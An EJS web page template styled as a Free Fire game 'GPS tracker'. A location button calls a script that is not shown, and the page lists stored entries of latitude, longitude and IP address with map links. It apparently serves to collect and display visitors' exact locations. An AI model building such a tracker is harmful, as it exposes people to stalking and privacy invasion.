<!DOCTYPE html>
<html>
<head>
  <title>Free Fire GPS Tracker</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    /* Background video */
    #bgVideo {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: -1;
      filter: brightness(0.4) blur(2px);
    }

    /* FF glowing card */
    .ff-card {
      background: rgba(0, 0, 0, 0.55);
      border: 2px solid #ff7b00;
      box-shadow: 0 0 25px #ff7b00aa;
      backdrop-filter: blur(5px);
      animation: fadeIn 0.5s ease-out;
    }

    /* FF glowing button */
    .ff-btn {
      background: linear-gradient(90deg, #ff8800, #ff3c00);
      color: #fff;
      padding: 14px 28px;
      border-radius: 10px;
      font-size: 20px;
      font-weight: bold;
      box-shadow: 0 0 30px #ff4d00aa;
      transition: 0.2s;
    }

    .ff-btn:hover {
      transform: scale(1.08);
      box-shadow: 0 0 40px #ff6a00ff;
    }

    /* Kill animation (button click) */
    @keyframes killFlash {
      0% { box-shadow: 0 0 0px red; }
      50% { box-shadow: 0 0 35px red; }
      100% { box-shadow: 0 0 0px red; }
    }

    .kill-effect {
      animation: killFlash 0.4s ease-out;
    }

    /* Fade animation */
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.96); }
      to { opacity: 1; transform: scale(1); }
    }

    /* Neon text */
    .ff-title {
      text-shadow: 0 0 15px #ff9100, 0 0 25px #ff3c00;
    }
  </style>
</head>

<body class="text-white p-6">

  <!-- ðŸ”¥ Background video -->
  <video autoplay loop muted id="bgVideo">
    <source src="https://cdn.discordapp.com/attachments/1109310900709501000/1317494920190203904/fire_bg.mp4" type="video/mp4">
  </video>

  <h1 class="text-4xl text-center font-extrabold ff-title mb-8">
    ðŸ”¥ FREE FIRE TRACKER ðŸŽ¯
  </h1>

  <div class="text-center mb-6">
    <button onclick="getLocation()" id="saveBtn" class="ff-btn">
      GET MY LOCATION ðŸ’¥
    </button>
  </div>

  <p id="msg" class="text-center text-yellow-300 font-bold text-lg mb-4"></p>

  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
    <% data.forEach(item => { %>
      <div class="ff-card p-4 rounded-xl">
        <p><b>Latitude:</b> <%= item.lat %></p>
        <p><b>Longitude:</b> <%= item.lon %></p>
        <p><b>IP Address:</b> <%= item.ip %></p>

        <a
          class="text-cyan-300 underline font-semibold"
          target="_blank"
          href="https://www.google.com/maps?q=<%= item.lat %>,<%= item.lon %>">
          â–¶ View On Google Maps
        </a>
      </div>
    <% }) %>
  </div>

  <%- include("script") %>

</body>
</html>